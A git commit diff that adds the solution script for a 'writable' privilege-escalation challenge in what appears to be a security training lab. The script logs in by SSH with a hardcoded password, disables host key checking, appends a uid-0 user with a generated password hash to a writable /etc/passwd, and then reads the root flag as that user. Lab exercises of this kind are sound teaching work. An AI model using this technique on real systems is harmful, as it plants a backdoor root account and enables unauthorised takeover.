74bc24f99ada0402bba2d6beed314b1a464ccd56
Catalin Iovita <cataliniovita@yahoo.com>
2022-07-25 22:02:07 +0300

    Add solution for writable challenge

--- privilege-escalation/activities/writable/sol/solution.sh
+++ privilege-escalation/activities/writable/sol/solution.sh
@@ -1,9 +1,12 @@
 #!/bin/bash
 
-if [ -z "$1"]
+generated_passwd=$(openssl passwd -1 -salt sparrow sparrow)
+passwd="sparrow:$generated_passwd:0:0:Sparrow:/root:/bin/bash"
+
+if [ -z "$1" ]
 then
-    echo "No IP supplied"
+    echo "No IP supplied. Please provide the target IP address!"
 else
-    echo $1
-    sshpass -p YvFWPeC7sTWJdaYQ ssh jack@$1 -p 2220
+    ip=$1
+    sshpass -pYvFWPeC7sTWJdaYQ ssh -o StrictHostKeyChecking=no jack@127.0.0.1 -p 2022 "echo $passwd >> /etc/passwd && echo "sparrow" | su -c \"cat /root/flag.txt\" sparrow"
 fi
